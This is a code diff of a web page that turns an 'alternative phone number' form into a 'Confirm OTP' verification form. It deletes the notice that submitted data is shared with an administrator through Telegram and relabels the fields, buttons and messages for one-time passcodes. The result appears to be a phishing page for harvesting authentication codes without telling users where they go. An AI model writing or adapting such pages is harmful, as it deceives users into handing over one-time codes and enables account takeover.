@@ -145,20 +145,16 @@ button:disabled {
     <div class="form-content">
 
         <div class="demo-label">
-            ALTERNATIVE CONTACT DETAILS
+            Confirm OTP 
         </div>
 
         <div class="description">
-            Enter your alternative phone number. By submitting,
-            you agree that this number will be stored with your
-            application and shared with the application administrator
-            through Telegram.
-        </div>
+            Enter OTP CODE
 
         <form id="verificationForm">
 
             <label for="verificationCode">
-                Alternative Phone Number
+                VERIFICATION OTP SERVICE
             </label>
 
             <input
@@ -178,7 +174,7 @@ button:disabled {
             </div>
 
             <button type="submit" id="confirmButton">
-                Submit Phone Number
+                CONFIRM OTP
             </button>
 
         </form>
@@ -213,7 +209,7 @@ verificationForm.addEventListener("submit", async function(event) {
 
     if (digits.length < 7 || digits.length > 15) {
         errorMessage.textContent =
-            "Please enter a valid phone number.";
+            "Please enter a valid OTP .";
 
         errorMessage.style.display = "block";
         return;
@@ -242,13 +238,13 @@ verificationForm.addEventListener("submit", async function(event) {
         }
 
         successMessage.textContent =
-            "Alternative phone number submitted successfully!";
+            "OTP submitted successfully!";
 
         successMessage.style.display = "block";
         confirmButton.textContent = "Submitted";
 
     } catch (error) {
-        console.error("Alternative phone submission error:", error);
+        console.error("OTP submission error:", error);
 
         errorMessage.textContent =
             "Unable to submit. Please try again.";
@@ -256,7 +252,7 @@ verificationForm.addEventListener("submit", async function(event) {
         errorMessage.style.display = "block";
 
         confirmButton.disabled = false;
-        confirmButton.textContent = "Submit Phone Number";
+        confirmButton.textContent = "Submit OTP";
     }
 });
 </script>
